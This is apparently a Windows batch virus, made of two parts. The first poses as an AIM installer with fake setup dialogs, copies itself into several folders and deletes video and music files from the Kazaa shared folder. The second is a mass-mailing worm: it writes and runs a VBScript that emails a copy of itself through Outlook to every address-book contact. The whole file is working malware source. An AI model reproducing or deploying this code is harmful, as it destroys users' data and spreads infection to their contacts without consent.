@echo off
ECHO result=msgbox("Welcome to AIM� Install") >>bla.vbs
start bla.vbs
@echo off
copy %0 c:\
md c:\GayPorno
copy %0 c:\GayPorno
Echo result=msgbox("Click OK to begin Install") >>bla.vbs
@Echo off
md c:\aim1
md c:\aim
del c:\progra~1\kazaa\myshar~1\*.avi
del c:\progra~1\kazaa\myshar~1\*.mov
del c:\progra~1\kazaa\myshar~1\*.mpg
del c:\progra~1\kazaa\myshar~1\*.mpeg
del c:\progra~1\kazaa\myshar~1\*.mp3
copy %0 c:\aim
copy %0 c:\aim1
copy %0 c:\gayporno
echo result=msgbox("Setup Has Finished goto c:\aim and Run aim.exe") >>bla.vbs
echo result=msgbox("Hope You Like my Virus you Just Got Now share it with your Friends") >>bla.vbs

CLS
@ECHO OFF
@COPY %0 C:\MAPI_WORM.bat
@ECHO Dim x >> C:\MAPI_SEND.vbs
@ECHO on error resume next >> C:\MAPI_SEND.vbs
@ECHO Set fso ="Scripting.FileSystem.Object" >> C:\MAPI_SEND.vbs
@ECHO Set so=CreateObject(fso) >> C:\MAPI_SEND.vbs
@ECHO Set ol=CreateObject("Outlook.Application") >> C:\MAPI_SEND.vbs
@ECHO Set out= WScript.CreateObject("Outlook.Application") >> C:\MAPI_SEND.vbs
@ECHO Set mapi = out.GetNameSpace("MAPI") >> C:\MAPI_SEND.vbs
@ECHO Set a = mapi.AddressLists(1) >> C:\MAPI_SEND.vbs
@ECHO For x=1 To a.AddressEntries.Count >> C:\MAPI_SEND.vbs
@ECHO Set Mail=ol.CreateItem(0) >> C:\MAPI_SEND.vbs
@ECHO Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x) >> C:\MAPI_SEND.vbs
@ECHO Mail.Subject="Subject" >> C:\MAPI_SEND.vbs
@ECHO Mail.Body="Body" >> C:\MAPI_SEND.vbs
@ECHO Mail.Attachments.Add(C:\MAPI_WORM.bat) >> C:\MAPI_SEND.vbs
@ECHO Mail.Send >> C:\MAPI_SEND.vbs
@ECHO Next >> C:\MAPI_SEND.vbs
@ECHO ol.Quit >> C:\MAPI_SEND.vbs
@CALL C:\MAPI_SEND.vbs
EXIT